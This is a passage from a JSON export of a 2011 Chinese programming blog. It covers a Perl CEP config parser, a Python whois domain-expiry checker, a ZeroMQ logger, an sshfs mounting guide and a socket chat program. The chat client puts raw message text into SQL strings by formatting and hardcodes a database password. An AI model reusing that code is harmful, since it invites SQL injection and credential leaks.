/^\\s*\\#/;\t\t\t\t\t#忽略注释\n\t\tif (my ($menu) = /\\[(\\w+)\\]/) {\t\t\t\t#遇到[a]\n\t\t\t\twhile (&lt;CEPCONF&gt;) {\t\t\t#循环读取[a]下的内容\n\t\t\t\t\tnext if /^$/;\n\t\t\t\t\tnext if /^\\s*\\#/;\n\t\t\t\t\tlast if /\\[\\/(\\w+)\\]/;\t\t#如果遇到[/a]结束此循环\n\t\t\t\t\tchomp;\n\t\t\t\t\tif (my ($pagename) = /\\[(\\w+)\\]/) {\t#又遇到[b]\n\t\t\t\t\t\twhile (&lt;CEPCONF&gt;) {\t\t\t#循环读取[]下的内容\n\t\t\t\t\t\tnext if /^$/;\n\t\t\t\t\t\tnext if /^\\s*\\#/;\n\t\t\t\t\t\tlast if /\\[\\/(\\w+)\\]/;\t\t\t#如果遇到[/b]结束此循环\n\t\t\t\t\t\tchomp;\n\t\t\t\t\t\tmy ($cfg_key,$cfg_value)= split /=/;\t#获取以=分隔的变量名，变量值\n\t\t\t\t\t\t$cfg_key =~ s/^\\s+|\\s+$//g;\t\t#去掉变量名前后的空白字符\n\t\t\t\t\t\t$cfg_value =~ s/\\#.*$//g;\t\t#去掉变量值后的注释\n\t\t\t\t\t\t$cfg_value =~ s/^\\s+|\\s+$//g;\t\t#去掉变量值前后的空白字符\n\t\t\t\t\t\t$cfg_value =~ s/['\"]//g;\t\t#去掉变量值前后的引号\n\t\t\t\t\t\t$config{$menu}-&gt;{$pagename}-&gt;{$cfg_key}=$cfg_value;\t\t#将变量名、变量值存入hash $config{a}-&gt;{b}-&gt;{变量名}=变量值\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\tnext if /\\[\\/(\\w+)\\]/;\t\t\t\t#遇到[/b]跳过\n\t\t\t\t\tmy ($cfg_key,$cfg_value)= split /=/;\t\t#获取以=分隔的变量名，变量值\n\t\t\t\t$cfg_key =~ s/^\\s+|\\s+$//g;\t\t\t\t#同上\n\t\t\t$cfg_value =~ s/\\#.*$//g;\n\t\t$cfg_value =~ s/^\\s+|\\s+$//g;\n\t\t$cfg_value =~ s/['\"]//g;\t\t\t\t\t#去掉变量值前后的引号\n\t$config{$menu}-&gt;{$cfg_key} = $cfg_value;\t#存入hash $config{a}-&gt;{变量名}=变量值\n\t\t\t}\n\t\t}\n\t}\n\tclose CEPCONF;\t\t#关闭文件句柄\n}</p>\n\n<p>#==为页面切换准备的hash==#\nsub for_change_page{\n\tmy @pages= keys %{$config{pagelist}};\t\t\t\t\t#取出pagelist下的所有键，即所有页面名\n\tforeach my $value (@pages) {\n\t\t$pagelist{$config{pagelist}-&gt;{$value}-&gt;{hotkey}} = $value;\t# hotkey =&gt; page\n\t\t\t}\n\tforeach my $hotkey (keys %pagelist) {\n\t\t$hotkeylist .= $hotkey;\t\t\t\t\t\t#将hotkey连接起来\n\t\t}\t\n\t\t$hotkeylist = qr/[$hotkeylist]/;\t\t\t\t#构建正则表达式\n}</p>\n\n<p>#==获取文件修改时间==#\nsub GetMtime{\n\tmy $type=shift;\n\tif ( $type =~ /new/) {\n\t\t$new_mtime=(stat ($logfile))[9];\n\t\t}\n\telsif ( $type =~ /old/ ) {\n\t\t$old_mtime=(stat ($logfile))[9];\n\t\t}\n}</p>\n\n<p>#==页面切换工作==#\nsub ChangePage{\n\tseek $Page,0,2;\t\t\t\t\t\t\t\t#读到文件结尾\n\tif ($config{pagelist}-&gt;{$Page}-&gt;{logfile} =~ /^\\//) {\n            our $logfile=\"$config{pagelist}-&gt;{$Page}-&gt;{logfile}.$date\";\n        } else {\n            our $logfile=\"$LogPath/$config{pagelist}-&gt;{$Page}-&gt;{logfile}.$date\";\n        }\n#\tour $logfile=\"$LogPath/$config{pagelist}-&gt;{$Page}-&gt;{logfile}.$date\";\t#日志文件名\n\tour $desc = $config{pagelist}-&gt;{$Page}-&gt;{desc} ||$Page ;\t\t#描述信息，默认为页面名\n\t&amp;GetMtime(old);\t\t\t\t\t\t\t\t#记录文件修改时间，被用来比较</p>\n\n<p>\tour $SortOrder=$SortOrder ||$config{pagelist}-&gt;{$Page}-&gt;{sortorder} || 1;</p>\n\n<p>\tour $fields=$config{pagelist}-&gt;{$Page}-&gt;{fields};\t\t\t#取出列名\n\tour @Fieldname = split /\\s+/,$fields;\t\t\t\t\t#将列名存入数组\n\tour $format=$config{pagelist}-&gt;{$Page}-&gt;{format};\t\t\t#取出结果输出格式\n\tour $f_title=$format;\t\t\t\t\t\t\t#列名的输出格式\n\t$f_title =~ s/\\.\\d+f|d/s/g;\t\t\t\t\t\t#列名都为字符串，将其它格式转成字符串</p>\n\n<p>\tour $f_gang = $f_title;\t\t\t\t\t\t\t#分割线---，和列名一样的输出格式\n\t$f_gang =~ s/[^\\d\\s]//g;\t\t\t\t\t\t#\n\tour @F_gang = split /\\s+/,$f_gang;\t\t\t\t\t#每列要输出多少个-，计入数组\n\tmy $count = @Fieldname;\t\t\t\t\t\t\t#列的数目</p>\n\n<p>\tmy $num = $count;\t\t\t\t\t\t\t#定一个值，和列的数目一样，用途为计算数组下标\n\tmy $tmp_regex;\t\t\t\t\t\t\t\t#声明临时正则表达式\n\twhile ($count) {\n\t\t$tmp_regex .= $Fieldname[$num -$count] . '=' . '([^,]+),\\s*';\t#每个列名后连一个等号和一个正则表达式\n\t\t$count--;\n\t\t}\t\n\t$tmp_regex =~ s/,\\\\s\\*$//;\t\t\t\t\t\t#去掉正则表达式末尾的 ,\\s*\n\tour $regex = qr/$tmp_regex/;\t\t\t\t\t\t#构建正则表达式，存入变量中\n}\n</pre></p>\n\n<p>他的ceptop.cfg配置类似于：</p>\n\n<p><pre class=\"sh_perl\">\n[main]\n    logpath=/cepdata\n    defaultpage=OpsSumTime\n[/main]</p>\n\n<p>[pagelist]\n    [OpsAvgTime]\n        desc\t= 平均执行时间统计\n        logfile = ops/AvgRequestTime.log\n        fields  = AvgTime Count Service Url\n        format  = %10.5f %7s %8s %-25s\n        hotkey  = a\n    [/OpsAvgTime]\n</pre> 可加入不同的pagelist实现不同的自定义效果</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "24"
    }
  },
  {
    "id": 91,
    "title": "（python）域名查询服务（whois）程序+检查5位以内域名到期时间邮件报警抢注域名！",
    "category": "python",
    "tags": [
      "whois",
      "域名查询",
      "域名爬虫"
    ],
    "url": "/archives/pythonyumingchaxunfuwuwhoischengxujiancha5weiyineiyumingdaoqishijianyoujianbaojingqiangzhuyuming/",
    "content": "<p>前言：这个程序写了挺长时间，主要的加‘-d’选项+域名（只支持.com域名）查询特定域名，不带任何参数后台运行（可以设定cron）脚本检查域名到期时间，发现域名还有5天以内到期报警提示，方便抢注呵呵！</p>\n\n<p>缺点：1  有些域名是没有域名信息的，比如a.com，p.com  所有就过滤掉了</p>\n\n<p>2  程序执行时间不会对负载有影响，但是可能出现socket超时，我设置了socket连接三次，但是可能会出现一些未知错误break，大家发现BUG留言我再修改</p>\n\n<p><pre class=\"sh_python\">\n#!/bin/env python\nimport sys\nimport string\nimport socket\nimport optparse\nimport smtplib\nimport re\nimport time\nimport itertools\nreload(sys)\nsys.setdefaultencoding('utf8') </p>\n\n<p>class Host(object):</p>\n\n<p>    INTERHOST           =\"whois.internic.net\"\n    NICHOST             = \"whois.crsnic.net\"\n    INICHOST            = \"whois.networksolutions.com\"\n    ip_whois = [ INTERHOST, NICHOST ,INICHOST ]</p>\n\n<p>class Whois(object) :</p>\n\n<p>    WHOIS_SERVER_ID     = \"Whois Server:\"\n    WHOIS_ORG_SERVER_ID = \"Registrant Street1:Whois Server:\"\n    WHOIS_RECURSE       = 0x01\n    WHOIS_QUICK         = 0x02</p>\n\n<p>    def whois(self, query, hostname, flags):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        fails =0\n        while True:\n            try:\n                if fails &lt;=3:\n                    s.connect((hostname, 43))\n            except socket.error:\n                fails +=1\n            else:\n                break\n                print 'Socket Connection timed out'\n        queryBytes = None\n        queryBytes = (query  + \"\\r\\n\").encode()\n        s.send(queryBytes)\n        response = ''\n        while True:\n            d = s.recv(4096)\n            response += d\n            if not d:\n                break\n        s.close()\n        nhost = None\n        nhost = self.findwhois_server(response.decode(), hostname)\n        if (nhost != None):\n            response += self.whois(query, nhost, 0)\n        return response.decode()\n    def findwhois_server(self, buf, hostname):\n        nhost = None\n        parts_index = 1\n        start = buf.find(Whois.WHOIS_SERVER_ID)\n        if (start == -1):\n            start = buf.find(Whois.WHOIS_ORG_SERVER_ID)\n            parts_index = 2</p>\n\n<p>        if (start &gt; -1):\n            end = buf[start:].find('\\n')\n            whois_line = buf[start:end+start]\n            whois_parts = whois_line.split(':')\n            nhost = whois_parts[parts_index].strip()\n        else:\n            for nichost in Host.ip_whois:\n                if (buf.find(nichost) != -1):\n                    nhost = nichost\n                    break\n        return nhost</p>\n\n<p>    def whois_lookup(self, options, query_arg, flags):\n        nichost = None\n        if (options == None):\n            options = {}</p>\n\n<p>        options['whoishost'] = Host.NICHOST\n        if ( not (flags &amp; Whois.WHOIS_QUICK)):\n            flags |= Whois.WHOIS_RECURSE\n        return self.whois(query_arg, options['whoishost'], flags)   </p>\n\n<p>class WhoisEntry(object):\n    _regex = {\n        'domain_name':      'Domain Name:\\s?(.+)',\n        'registrar':        'Registrar:\\s?(.+)',\n        'whois_server':     'Whois Server:\\s?(.+)',\n        'referral_url':     'Referral URL:\\s?(.+)',\n        'updated_date':     'Updated Date:\\s?(.+)',\n        'creation_date':    'Creation Date:\\s?(.+)',\n        'expiration_date':  'Expiration Date:\\s?(.+)',\n        'name_servers':     'Name Server:\\s?(.+)',\n        'status':           'Status:\\s?(.+)',\n        'emails':           '[\\w.-]+@[\\w.-]+\\.[\\w]{2,4}',\n    }\n    def __init__(self, domain, text, regex=None):\n        self.domain = domain\n        self.text = text\n        if regex is not None:\n            self._regex = regex</p>\n\n<p>    def __getattr__(self, attr):\n        whois_regex = self._regex.get(attr)\n        if whois_regex:\n            setattr(self, attr, re.findall(whois_regex, self.text))\n            return getattr(self, attr)</p>\n\n<p>        else:\n            raise KeyError('Unknown attribute: %s' % attr)</p>\n\n<p>    def __str__(self):\n        return '\\n'.join('%s: %s' % (attr, str(getattr(self, attr))) for attr in self.attrs())</p>\n\n<p>    def attrs(self):\n        return sorted(self._regex.keys())</p>\n\n<p>    @staticmethod\n    def load(domain, text):\n        if text.strip() == 'No whois server is known for this kind of object.':\n            pass\n        return WhoisCom(domain, text)\nclass WhoisCom(WhoisEntry):\n    def __init__(self, domain, text):\n        if 'No match for \"' in text:\n            pass\n        else:\n            WhoisEntry.__init__(self, domain, text)\nclass Email(object):\n    def __init__(self,body):\n        mail_server = 'mail.dongwm.com'\n        mail_server_port = 25\n        from_addr='whois_check@dongwm.com'\n        to_addr ='dongwm@dongwm.com'\n        from_header = 'From: %s\\r\\n' % from_addr#    to_header = 'To: %s\\r\\n\\r\\n' % to_addr\n        to_header = 'To: %s\\r\\n\\r\\n' % to_addr\n        subject_header = 'Subject: Yuming check'\n        email_message = '%s\\n%s\\n%s\\n\\n%s' % (from_header, to_header, subject_header, body)\n        s = smtplib.SMTP(mail_server, mail_server_port)\n        s.sendmail(from_addr, to_addr, email_message)\n        s.quit()</p>\n\n<p>def parse_command_line(argv):\n    usage = \"usage: %prog [options] name\"\n    parser = optparse.OptionParser(add_help_option=False, usage=usage)\n    parser.add_option(\"-d\", \"--domain\", action=\"store_const\",\n                      const=Host.NICHOST, dest=\"whoishost\",\n                      help=\"Query for a specific domain name, please use: XXX.com format\")\n    parser.add_option(\"-h\", \"--help\", action=\"help\")\n    return parser.parse_args(argv)</p>\n\n<p>if __name__ == \"__main__\":\n     whoisclient = Whois()\n     (options, args) = parse_command_line(sys.argv)\n     if len(sys.argv)==3 and re.sub('^.*://', '', args[1]).split('/')[0].lower().split('.')[1]  in 'com':\n             text = whoisclient.whois_lookup(options.__dict__,args[1], 0)\n             print  WhoisEntry.load(args[1], text)</p>\n\n<p>     elif len(sys.argv)==1:\n         #for i in range(97,123):\n         #   print chr(i)\n         len = 1\n         while (len&lt;6):\n             for i in list(itertools.permutations(string.lowercase,len)):\n                 if whoisclient.whois_lookup(options.__dict__,''.join(i)+'.com', 0).encode('utf8').find('Expiration Date: ') != -1:\n                     sa = whoisclient.whois_lookup(options.__dict__,''.join(i)+'.com', 0).encode('utf8').split('Expiration Date: ')[1].split(r'&gt;&gt;&gt; Last')[0][:-2]\n                     wtime = time.strftime('%d-%b-%Y',time.localtime(time.time()))\n                     if wtime.lower()[3:6] == sa[3:6] and wtime[7:11] == sa[7:11] and int(sa[0:2]) - int(wtime[0:2]) &lt;=5 and int(sa[0:2]) - int(wtime[0:2]) &gt;=0:\n                         tt = '%s is %s' % (''.join(i)+'.com',sa)\n                         Email(tt)\n                         time.sleep(1)\n             len +=1\n     else:\n             print \"Please use the '-h' or '--help' parameter\"\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "24"
    }
  },
  {
    "id": 92,
    "title": "复杂事件(cep)处理的消息队列zmq在server端的python日志记录处理脚本",
    "category": "cep",
    "tags": [
      "logger",
      "zeromq",
      "zmq",
      "复杂时间处理",
      "消息队列"
    ],
    "url": "/archives/fuzashijiancepchulidexiaoxiduiliezmqzaiserverduandepythonchulijiaoben/",
    "content": "<p><p>前言：主要用来接收客户端服务器传送来的socket内容，并写到指定数据目录下。</p>\n<p><pre class=\"sh_python\"></p>\nimport zmq\nimport threading\nfrom datetime import date</p>\n\n<p>def main(addrs):</p>\n\n<p>    context = zmq.Context()\n    client = context.socket(zmq.SUB)\n    client.setsockopt(zmq.SUBSCRIBE, \"\")\n    print \"Connecting to: \", addrs[0]\n    client.connect(addrs[0])</p>\n\n<p>    try:\n        while True:\n                topic, msg = client.recv_multipart()\n                #print \"%s: %s\" % (topic, msg)\n                FILE = open(addrs[1]+topic+\".log.\"+ date.today().isoformat(), \"a\"  )\n                FILE.write(msg )\n                FILE.close()\n    except KeyboardInterrupt:\n        raise SystemExit</p>\n\n<p>if __name__ == '__main__':\n    import sys\n    if len(sys.argv) &lt; 2:\n        print \"usage: logger.py &lt;address&gt; &lt;path&gt;\"\n        raise SystemExit\n    main(sys.argv[1:])\n<p></pre></p>\n</p>\n",
    "date": {
      "year": "2011",
      "month": "August",
      "day": "26"
    }
  },
  {
    "id": 93,
    "title": "debian下使用sshfs＋fuse挂载远端文件系统",
    "category": "debian",
    "tags": [
      "fuse",
      "sshfs",
      "远端文件系统"
    ],
    "url": "/archives/debianxiashiyongsshfsfuseguazaiyuanduanwenjianxitong/",
    "content": "<p>前言：这个想法是因为在linux通过wine安装editplus后发现不能编辑ftp远程服务器的代码。而bluefish也没有提供远程ftp编辑的功能，于是想将远程服务器的文件系统挂载到本地（但是因为某些原因，他没有类似于nfs这样的网络文件系统），于是有了此文－－通过ssh的特性。而fuse,他是Linux 中用于挂载某些网络空间，如SSH，到本地文件系统的模块。</p>\n\n<p>1  安装fuse和sshfs：</p>\n\n<p>dongwm@dongwm:~$sudo apt-get install sshfs fuse-utils</p>\n\n<p>2 将你想要的用户（这里是我的用户dongwm）添加到fuse组里面：</p>\n\n<p>dongwm@dongwm:~$sudo adduser dongwm fuse   ＃为了生效需要注销再进来</p>\n\n<p>3 加载fuse模块：</p>\n\n<p>dongwm@dongwm:~$sudo modprobe fuse</p>\n\n<p>注：如果想开机自动加载这个模块需要编辑t<strong>/etc/modules</strong>   添加 “fuse”到单独的一行</p>\n\n<p>4 创建相应挂载目录，然后挂载远端文件系统，前提是要有很高的权限，比如我要挂载根目录，就需要root的 ssh密码或者信任，格式如下：</p>\n\n<p>dongwm@dongwm:~$mkdir 挂载目录</p>\n\n<p>dongwm@dongwm:~$sshfs  远程服务器用户名称@服务器地址:/服务器目录  挂载目录</p>\n\n<p>看我的挂载：</p>\n\n<p>dongwm@dongwm:~$ df -h\n文件系统          容量  已用  可用 已用%% 挂载点\n/dev/sda1              74G  5.6G   65G   9% /\ntmpfs                 1.9G     0  1.9G   0% /lib/init/rw\nudev                  1.9G  196K  1.9G   1% /dev\ntmpfs                 1.9G     0  1.9G   0% /dev/shm\n/dev/sda2             382G  7.0G  356G   2% /home\nroot@192.168.10.89:/ 1000G     0 1000G   0% /home/dongwm/10.89</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "September",
      "day": "16"
    }
  },
  {
    "id": 94,
    "title": "基于console终端的交互socket聊天程序（服务器端）",
    "category": "python",
    "tags": [
      "socket聊天",
      "threading"
    ],
    "url": "/archives/jiyuconsolezhongduandejiaohusocketliaotianchengxufuwuqiduan/",
    "content": "<p>前言：这个socket程序和客户端一起，其中mysqldb模块操作是import client</p>\n\n<p><pre class=\"sh_python\">\n#!/usr/bin/env python\n#-*- coding: utf8 -*-\n'''just a Just a server-side script'''\nimport socket, traceback, os, sys, time\nfrom time import ctime\nfrom threading import *\nfrom client import mysqldb\nfrom optparse import OptionParser</p>\n\n<p>host = ''\nport = 8888\nMAXTHREADS = 3\nlockpool = Lock()\nbusylist = {}\nwaitinglist = {}\nqueue = []\nsem = Semaphore(0) #当计数器为0时，acquire()将阻塞线程至同步锁定状态，直到其他线程调用release()</p>\n\n<p>class MYthread(mysqldb):\n    def handleconnt(self,clientsock,choice):\n        lockpool.acquire() #使线程进入同步阻塞状态，尝试获得锁定\n        print \"Received new client connection.\"\n        #判断等待线程是否到达最大线程数，是，就会关闭socket\n        try:\n            if len(waitinglist) == 0 and (activeCount() - 1) &gt;= MAXTHREADS:\n                clientsock.close()\n                return\n            if len(waitinglist) == 0:\n                self.mythread(choice)\n            queue.append(clientsock) #socket加入队列，semaphore被释放\n            sem.release()\n        finally:\n            lockpool.release()\n#多线程模板，启动线程\n    def mythread(self,myth):\n        print \"Starting new client processor thread\"\n        t = Thread(target = self.threadworker,args= [myth])\n        t.setDaemon(1)\n        t.start()\n#多线程运行的函数，处理终止的线程，初始化waitinglist\n    def threadworker(self,choice):\n        global waitinglist, lockpool, busylist\n        time.sleep(1) \n        name = currentThread().getName()\n        try:\n            lockpool.acquire()\n            try:\n                waitinglist[name] = 1\n            finally:\n                lockpool.release()\n            self.processclients(choice)\n        finally:\n            print \"** WARNING** Thread %s died\" % name\n            if name in waitinglist:\n                del waitinglist[name]\n            if name in busylist:\n                del busylist[name]\n            self.mythread(choice)\n#让接收和发送socket作为2个线程\n    def mthread(self,clientsock):\n        mlist = []\n        for th in ['rev','sed']:\n             t = Thread(target = self.handleconnt,args = [clientsock,th])\n             mlist.append(t)\n             t.setDaemon(1)\n             t.start()\n        for t in mlist:\n             t.join()\n#响应客户端连接的处理请求\n    def processclients(self,choice):\n        global sem, queue, waitinglist, busylist, lockpool\n        name = currentThread().getName()\n        self.mysqlconnt=mysqldb()</p>\n\n<p>        while 1:\n            sem.acquire()\n            lockpool.acquire()\n            try:\n                clientsock = queue.pop(0)\n                del waitinglist[name]\n                busylist[name] = 1\n            finally:\n                lockpool.release()</p>\n\n<p>            try:\n                print \"[%s] Got connection from %s\" % \\\n                        (name, clientsock.getpeername())\n                if choice == \"sed\":\n                    while 1:\n                        try:\n                            sys.stdout.write('&gt;')\n                            data = sys.stdin.readline()\n                            sys.stdout.flush()\n                            if not data:\n                                break\n                            clientsock.sendall('[%s] %s' % (ctime(),data))\n                            self.mysqlconnt.insert('Server',socket.gethostbyname(socket.gethostname()),ctime(),data)\n                        except socket.error, e:\n                            print \"Error sending data : %s\" % e\n                            sys.exit(1)\n                elif choice == \"rev\":\n                     while 1:\n                         try:\n                             buf = clientsock.recv(2048)\n                         except socket.error, e:\n                             print \"Error receiving data: %s\" % e\n                             sys.exit(1)\n                         if not len(buf):\n                             break\n                         print \"%s says: %s \"  % (clientsock.getpeername(),buf)\n                         self.mysqlconnt.insert('Server',socket.gethostbyname(socket.gethostname()),ctime(),buf)</p>\n\n<p>            except (KeyboardInterrupt, SystemExit):\n                raise\n            except:\n                traceback.print_exc()</p>\n\n<p>            try:\n                clientsock.close()\n            except KeyboardInterrupt:\n                raise\n            except:\n                traceback.print_exc()</p>\n\n<p>            lockpool.acquire()\n            try:\n                del busylist[name]\n                waitinglist[name] = 1\n            finally:\n                lockpool.release()\n#接收socket，并且指定MYthread类处理\ndef listener():\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        s.bind((host, port))\n        s.listen(1)</p>\n\n<p>        while 1:\n            try:\n                clientsock, clientaddr = s.accept()\n            except KeyboardInterrupt:\n                raise\n            except:\n                traceback.print_exc()\n                continue\n            mythread = MYthread()\n            mythread.mthread(clientsock)\n#主函数\nif __name__ == '__main__':\n    argc = len(sys.argv)\n    parser = OptionParser(description=\"Socket Talk Shell\",add_help_option=False,prog=\"Client.py\",version=\"1.0\",usage=\"%prog\")\n    parser.add_option(\"-h\", \"--help\",action = \"help\",help=\"print help\")\n    parser.add_option(\"-p\", \"--print\",action=\"store_true\",help=\"print data in mysql\")\n    options, arguments=parser.parse_args()\n    if argc == 1:\n        listener()\n    if '-h' in sys.argv  or '--help' in sys.argv:\n        print __doc__\n    elif '-p'  in sys.argv  or '--print' in sys.argv:\n        mysqldbconnt=mysqldb()\n        mysqldbconnt.select('Server')\n    else:\n       print 'Please run this script without parameters'\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "September",
      "day": "16"
    }
  },
  {
    "id": 95,
    "title": "基于console终端的交互socket聊天程序（客户端）",
    "category": "python",
    "tags": [
      "MySQLdb",
      "socket聊天",
      "多线程",
      "多进程"
    ],
    "url": "/archives/jiyuconsolezhongduandejiaohusocketliaotianchengxukehuduan/",
    "content": "<p>前言：这是初步学习的一个练习，需要实现多线程池，使用MySQLdb模块，并发等。但是实际工作发现，不能使用多进程将接受和发送socket分离，因为raw_input需要console支持，所以只能通过多线程+多线程实现。文中还实现了一个显示进度的“旋转竖线”效果，解决了多线程无法CTRL＋C 退出的问题</p>\n\n<p><pre class=\"sh_python\">\n#!/usr/bin/env python\n#-*- coding: utf8 -*-</p>\n\n<p>import os,socket, sys, time,traceback,signal\nfrom time import ctime\nfrom threading import *\nfrom optparse import OptionParser\nimport MySQLdb\n#from multiprocessing import Process</p>\n\n<p>host = '192.168.8.46'\ntextport = '8888'\ncv = Condition()  #Condition比lock功能多\nspinners = '|/-\\\\'\nspinpos = 0\nequeue = []</p>\n\n<p>class MYmsg:\n    '''主要是一些信息输出的线程定义以及线程模板'''\n    #接受用户input信息\n    def fwrite(self,buf):\n        sys.stdout.write(buf)\n        sys.stdout.flush()\n#旋转竖线定义\n    def spin(self):\n        global spinners, spinpos\n        self.fwrite(spinners[spinpos] + \"\\b\")\n        spinpos += 1\n        if spinpos &gt;= len(spinners):\n            spinpos = 0\n#把旋转竖线放入线程，运行用户接口,调用wait()使竖线旋转\n    def uithread(self):\n        global cv, equeue\n        while 1:\n            cv.acquire()\n            while not len(equeue):\n                cv.wait(0.15)\n                self.spin()</p>\n\n<p>            msg = equeue.pop(0)\n            cv.release()\n            if msg == 'QUIT':\n                self.fwrite(\"\\n\")\n                sys.exit(0)\n            self.fwrite(\" \\n  %s\\r\" % msg)\n#把打印信息放入线程，调用notify(),添加队列通知其他线程\n    def msg(self,message):\n        global cv, equeue\n        cv.acquire()\n        equeue.append(message)\n        cv.notify()\n        cv.release()\n#定义的线程模板方法\n    def mythread(self,myth,flag=0):\n        if flag:\n            t = Thread(target = myth,args = [arg])\n        else:\n            t = Thread(target = myth)\n        t.setDaemon(True)\n        t.start()</p>\n\n<p>class Watcher:\n    '''用新进程来接受信号后杀掉执行任务进程,主要解决多线程只能杀掉主线程的问题，无法ctrl +c 退出'''\n#创建一个子线程，它返回父线程等待一个KeyboardInterrupt，然后杀死子线程\n    def __init__(self):\n        self.child = os.fork()\n        if self.child == 0:\n            return\n        else:\n            self.watch()\n    def watch(self):\n        try:\n            os.wait()\n        except KeyboardInterrupt:\n            print 'KeyBoardInterrupt'\n            self.kill()\n        sys.exit()\n    def kill(self):\n        try:\n            os.kill(self.child, signal.SIGKILL)\n        except OSError:\n            pass</p>\n\n<p>class MYconnt(MYmsg):\n    '''\n    socket连接，打印信息，异常处理\n    '''\n    def __init__(self):\n        self.msg=MYmsg()\n    def connt(self):\n        self.msg.mythread(self.uithread)  #使用旋转竖线\n        try:\n            self.msg.msg('Creating socket object')\n            time.sleep(3)</p>\n\n<p>            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        except socket.error, e:\n            print \"Strange error creating socket: %s\" % e\n            sys.exit(1)</p>\n\n<p>        try:\n            port = int(textport)\n        except ValueError:\n            try:\n                port = socket.getservbyname(textport, 'tcp')\n            except socket.error, e:\n                print \"Couldn't find your port: %s\" % e\n                sys.exit(1)</p>\n\n<p>        self.msg.msg('Connecting to %s:%d' % (host, port))\n        time.sleep(2)\n        try:\n            s.connect((host, port))\n        except socket.gaierror, e:\n            print \"Address-related error connecting to server: %s\" % e\n            sys.exit(1)\n        except socket.error, e:\n            print \"Connection error: %s\" % e\n            sys.exit(1)\n        self.msg.msg(\"QUIT\")\n        return s</p>\n\n<p>class MYtalk(MYconnt):\n    '''\n    聊天程序接受和发送\n    '''\n    def __init__(self):\n        self.myconnt=MYconnt()\n        self.s = self.myconnt.connt()\n#根据参数选择发送或者接收socket信息\n    def choice(self,th):\n        self.mysqlconnt = mysqldb()\n        if th == 'sed':\n            while 1:\n                try:\n                    buf = self.s.recv(2048)\n                except socket.error, e:\n                    print \"Error receiving data: %s\" % e\n                    sys.exit(1)\n                except KeyboardInterrupt:\n                    raise\n                    self.mysqlconnt.close()\n                if not len(buf):\n                    break\n                print \"%s says: %s\" % (self.s.getpeername(),buf)\n                self.mysqlconnt.insert('Client',self.s.getpeername()[0],buf.split(']')[0][1:],buf.split(']')[1])\n        elif th == 'rev':\n            while 1:</p>\n\n<p>                try:\n                    sys.stdout.write('&gt;')\n                    self.data = sys.stdin.readline()\n                    sys.stdout.flush()\n                    if not self.data:\n                        break\n                    elif self.data == \"quit\":\n                        try:\n                            self.s.shutdown(1)\n                        except socket.error, e:\n                            print \"Error sending data (detected by shutdown): %s\" % e\n                            sys.exit(1)</p>\n\n<p>                    self.s.sendall('[%s] %s' % (ctime(),self.data))\n                    self.mysqlconnt.insert('Client',socket.gethostbyname(socket.gethostname()),ctime(),self.data)\n                except KeyboardInterrupt:\n                    raise</p>\n\n<p>                except socket.error, e:\n                    print \"Error sending data: %s\" % e\n                    sys.exit(1)\n#将接收和发送放在不同的进程\n    def process(self):\n        plist = []\n        for th in ['rev','sed']:\n            p = Process(target=self.choice,args = [th])\n            plist.append(p)\n            p.start()\n        for p in plist:\n            p.join()\n#将接收和发送放在不同的线程\n    def mthread(self):\n         mlist = []\n         for th in ['rev','sed']:\n             Watcher()\n             t = Thread(target = self.choice,args = [th])\n             mlist.append(t)\n             t.setDaemon(1)\n             t.start()\n         for t in mlist:\n             t.join()</p>\n\n<p>class mysqldb:\n    def __init__(self):\n        try :\n            self.conn = MySQLdb.connect(host = \"192.168.8.46\",user = \"dongwm\",passwd = \"test123\",db = \"talk\")\n        except MySQLdb.Error, e:\n            print \"Error %d: %s\" % (e.args[0], e.args[1])\n            sys.exit (1)\n        try :\n            self.cursor = self.conn.cursor()\n        except :\n            raise\n    def insert(self,table,ip,time,text):\n        sql = \"insert into %s(ip,time,text) values('%s','%s','%s');\" % (table,ip,time,text)\n        try:\n            self.cursor.execute(sql)\n        except Exception,e:\n            print  e\n    def select(self,table):\n        sql = \"select * from %s;\" % table\n        try:\n            self.cursor.execute(sql)\n        except Exception,e:\n            print e\n        for data in self.cursor.fetchall():\n            print '%s\\t%s\\t%s' % data\n    def close():\n        self.cursor.close()\n        self.conn.commit()\n        self.conn.close()\n#主函数\nif __name__ == '__main__':\n    argc = len(sys.argv)\n    parser = OptionParser(description=\"Socket Talk Shell\",add_help_option=False,prog=\"Client.py\",version=\"1.0\",usage=\"%prog\")\n    parser.add_option(\"-h\", \"--help\",action = \"help\",help=\"print help\")\n    parser.add_option(\"-p\", \"--print\",action=\"store_true\",help=\"print data in mysql\")\n    options, arguments=parser.parse_args()\n    if argc == 1:\n        mytalk=MYtalk()\n        mytalk.mthread()\n    if '-h' in sys.argv  or '--help' in sys.argv:\n        print __doc__\n    elif '-p'  in sys.argv  or '--print' in sys.argv:\n        mysqldbconnt=mysqldb()\n        mysqldbconnt.select('Client')\n    else:\n       print 'Please run this script without parameters'\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "September",
      "day": "16"
    }
  },
  {
    "id": 96,
    "title": "复杂事件（cep）处理多个结果同窗口展示",
    "category": "cep",
    "tags": [
      "cepstat",
      "dstat",
      "perl结果展示"
    ],
    "url": "/archives/cepfuzashijianchuliduogejieguotongchuangkouzhanshi/",
